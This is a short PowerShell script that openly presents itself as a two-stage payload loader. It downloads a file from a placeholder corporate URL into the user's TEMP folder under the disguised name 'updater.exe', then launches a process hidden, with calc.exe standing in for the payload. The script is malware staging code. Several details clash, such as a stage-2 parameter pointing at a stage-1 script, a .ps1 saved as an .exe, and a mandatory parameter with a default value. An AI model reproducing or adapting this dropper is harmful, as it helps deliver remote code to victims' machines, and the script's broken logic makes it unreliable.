
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage2Url = "https://internal.corp/stage1.ps1",
    [string]$WorkingPath = "$env:TEMP\updater.exe",
    [int]$TransferTimeout = 217
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
